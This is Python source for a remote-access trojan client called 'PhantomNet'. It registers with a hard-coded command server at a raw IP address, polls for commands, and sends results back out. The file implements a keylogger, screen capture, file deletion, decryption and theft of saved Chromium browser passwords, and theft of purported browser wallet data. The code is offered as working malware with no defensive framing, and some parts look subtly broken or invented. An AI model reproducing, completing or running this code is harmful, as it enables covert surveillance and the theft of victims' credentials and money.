import requests, json, os, base64, subprocess, socket, platform, psutil, time, ctypes, ctypes.wintypes, sqlite3, threading, sys
from Crypto.Cipher import AES, DES3
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

SERVER_URL = "https://3.148.91.3:8443"
BOT_ID = SESSION_TOKEN = None

def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return iv + ct

def decrypt_data(encrypted_data, key):
    iv = base64.b64decode(encrypted_data[:24])
    ct = base64.b64decode(encrypted_data[24:])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

def get_system_info():
    try:
        return {
            "hostname": socket.gethostname(),
            "os_info": f"{platform.system()} {platform.release()}",
            "username": os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
            "capabilities": {
                "system_info": True,
                "network_scan": True,
                "process_list": True,
                "file_system": True,
                "registry_data": platform.system() == "Windows",
                "screenshot": True,
                "keylogger": platform.system() == "Windows",
                "chromium_credentials": platform.system() == "Windows"
            }
        }
    except Exception as e:
        return {
            "hostname": "unknown",
            "os_info": "unknown",
            "username": "unknown",
            "capabilities": {}
        }

def send_registration():
    global BOT_ID, SESSION_TOKEN
    system_info = get_system_info()
    try:
        response = requests.post(f"{SERVER_URL}/bot/register", json=system_info, timeout=30, verify=False)
        if response.status_code == 200:
            data = response.json()
            BOT_ID = data.get('bot_id')
            SESSION_TOKEN = data.get('session_token')
            return SESSION_TOKEN
        return None
    except Exception as e:
        return None

def receive_commands():
    if not BOT_ID or not SESSION_TOKEN:
        return None
    try:
        headers = {'X-Session-Token': SESSION_TOKEN}
        response = requests.get(f"{SERVER_URL}/bot/command/{BOT_ID}", headers=headers, timeout=30, verify=False)
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        return None

def send_command_result(command_id, result):
    if not SESSION_TOKEN:
        return False
    try:
        headers = {'X-Session-Token': SESSION_TOKEN}
        data = {'result': str(result)}
        response = requests.post(f"{SERVER_URL}/bot/result/{command_id}", json=data, headers=headers, timeout=30, verify=False)
        if response.status_code == 200:
            return True
        return False
    except Exception as e:
        return False

def execute_command(command, args):
    try:
        if command == "keylogger":
            return start_keylogger(args)
        elif command == "screenshot":
            return capture_screenshot(args)
        elif command == "browser_logins":
            return steal_browser_logins(args)
        elif command == "browser_wallets":
            return steal_browser_wallets(args)
        elif command == "delete_file":
            return delete_file(args)
        return f"Unknown command: {command}"
    except Exception as e:
        return str(e)

def start_keylogger(args):
    keylogger_script = """import pythoncom, pyHook, win32api, win32con, win32gui, time, os
log_file = r'C:\\keylog.txt'
def on_keyboard_event(event):
    with open(log_file, 'a') as f:
        f.write(f'{event.Time}: {event.Key}\n')
    return True
hm = pyHook.HookManager()
hm.KeyDown = on_keyboard_event
hm.HookKeyboard()
pythoncom.PumpMessages()
"""
    with open("keylogger.py", "w") as f:
        f.write(keylogger_script)
    subprocess.Popen(["python", "keylogger.py"])
    return "Keylogger started"

def capture_screenshot(args):
    try:
        screenshot_path = args.get('path', 'screenshot.png')
        if platform.system() == "Windows":
            import PIL.ImageGrab
            screenshot = PIL.ImageGrab.grab()
            screenshot.save(screenshot_path)
            return f"Screenshot captured at {screenshot_path}"
        else:
            subprocess.run(["scrot", screenshot_path])
            return f"Screenshot captured at {screenshot_path}"
    except Exception as e:
        return f"Failed to capture screenshot: {e}"

def steal_browser_logins(args):
    browser_paths = find_browser_paths()
    logins = []
    for browser, path in browser_paths.items():
        master_key = get_chromium_master_key(path)
        if master_key:
            logins.extend(get_chromium_logins(os.path.join(path, 'Login Data'), master_key))
    return logins

def steal_browser_wallets(args):
    browser_paths = find_browser_paths()
    wallets = []
    for browser, path in browser_paths.items():
        master_key = get_chromium_master_key(path)
        if master_key:
            wallets.extend(get_chromium_wallets(os.path.join(path, 'Wallet Data'), master_key))
    return wallets

def delete_file(args):
    file_path = args.get('path')
    if os.path.exists(file_path):
        os.remove(file_path)
        return f"File {file_path} deleted"
    return f"File {file_path} not found"

def submit_system_info():
    if not BOT_ID or not SESSION_TOKEN:
        return False
    try:
        headers = {'X-Session-Token': SESSION_TOKEN}
        system_data = {
            'bot_id': BOT_ID,
            'system_info': get_system_info()
        }
        response = requests.post(f"{SERVER_URL}/bot/data/system_info", json=system_data, headers=headers, timeout=30, verify=False)
        if response.status_code == 200:
            return True
        return False
    except Exception as e:
        return False

def main():
    print("PhantomNet Client Starting...")
    print(f"Server: {SERVER_URL}")
    session_token = send_registration()
    if not session_token:
        sys.exit(1)
    submit_system_info()
    print("Connected to C2 server. Listening for commands...")
    try:
        while True:
            command_data = receive_commands()
            if command_data and command_data != {'status': 'no_command'}:
                command_id = command_data.get('id')
                command = command_data.get('command')
                args = command_data.get('args', {})
                result = execute_command(command, args)
                success = send_command_result(command_id, result)
                if success:
                    print(f"Command {command_id} completed successfully")
                else:
                    print(f"Failed to send result for command {command_id}")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\nShutting down PhantomNet client...")
    except Exception as e:
        print(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

DATA_BLOB = ctypes.Structure
DATA_BLOB._fields_ = [
    ('cbData', ctypes.wintypes.DWORD),
    ('pbData', ctypes.POINTER(ctypes.c_char))
]

def get_data(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = ctypes.c_buffer(cbData)
    ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
    ctypes.windll.kernel32.LocalFree(pbData)
    return buffer.raw

def crypt_unprotect_data(encrypted_bytes):
    buffer_in = ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        return get_data(blob_out)
    return None

def get_chromium_master_key(browser_path):
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = f.read()
    try:
        encrypted_key = base64.b64decode(local_state.split('"encrypted_key":"')[1].split('"')[0])
        encrypted_key = encrypted_key[5:]
        decrypted_key = crypt_unprotect_data(encrypted_key)
        return decrypted_key
    except Exception as e:
        return None

def decrypt_password(buff, master_key):
    if buff.startswith(b'v10') or buff.startswith(b'v11'):
        return decrypt_aes(buff, master_key)
    elif buff.startswith(b'dc'):
        return decrypt_des(buff, master_key)
    return "N/A (Not encrypted with modern method)"

def decrypt_aes(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Failed to decrypt"

def decrypt_des(buff, master_key):
    try:
        iv = buff[3:8]
        payload = buff[8:]
        cipher = DES3.new(master_key, DES3.MODE_CBC, iv)
        decrypted_pass = unpad(cipher.decrypt(payload), 8).decode()
        return decrypted_pass
    except Exception as e:
        return "Failed to decrypt"

def find_browser_paths():
    paths = {}
    user_profile = os.path.expanduser('~')
    app_data = os.path.join(user_profile, 'AppData')
    browser_definitions = {
        'chrome': os.path.join(app_data, 'Local', 'Google', 'Chrome', 'User Data'),
        'edge': os.path.join(app_data, 'Local', 'Microsoft', 'Edge', 'User Data'),
        'opera': os.path.join(app_data, 'Roaming', 'Opera Software', 'Opera Stable'),
        'firefox_profiles': os.path.join(app_data, 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
    }
    for browser, path in browser_definitions.items():
        if browser != 'firefox_profiles' and os.path.exists(os.path.join(path, 'Default')):
            paths[browser] = os.path.join(path, 'Default')
    if os.path.exists(browser_definitions['firefox_profiles']):
        for profile in os.listdir(browser_definitions['firefox_profiles']):
            if '.default-release' in profile:
                paths['firefox'] = os.path.join(browser_definitions['firefox_profiles'], profile)
                break
    return paths

def get_chromium_logins(db_path, master_key, retries=3, delay=2):
    if not os.path.exists(db_path) or not master_key:
        return []
    temp_db_path = os.path.join(os.environ["TEMP"], "LoginData.db")
    for attempt in range(retries):
        try:
            manual_copy_with_admin(db_path, temp_db_path)
            break
        except PermissionError as e:
            time.sleep(delay)
    else:
        return []
    results = []
    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, encrypted_password in cursor.fetchall():
            password = decrypt_password(encrypted_password, master_key)
            if username and password:
                results.append({"url": url, "username": username, "password": password})
        conn.close()
        os.remove(temp_db_path)
    except Exception as e:
        pass
    return results

def get_chromium_wallets(db_path, master_key, retries=3, delay=2):
    if not os.path.exists(db_path) or not master_key:
        return []
    temp_db_path = os.path.join(os.environ["TEMP"], "WalletData.db")
    for attempt in range(retries):
        try:
            manual_copy_with_admin(db_path, temp_db_path)
            break
        except PermissionError as e:
            time.sleep(delay)
    else:
        return []
    results = []
    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, crypto_wallet, crypto_wallet_address, crypto_wallet_extra_info FROM wallets")
        for url, crypto_wallet, crypto_wallet_address, crypto_wallet_extra_info in cursor.fetchall():
            if crypto_wallet and crypto_wallet_address:
                results.append({"url": url, "crypto_wallet": crypto_wallet, "crypto_wallet_address": crypto_wallet_address, "crypto_wallet_extra_info": crypto_wallet_extra_info})
        conn.close()
        os.remove(temp_db_path)
    except Exception as e:
        pass
    return results

def manual_copy_with_admin(src, dst):
    import shutil
    shutil.copy2(src, dst)
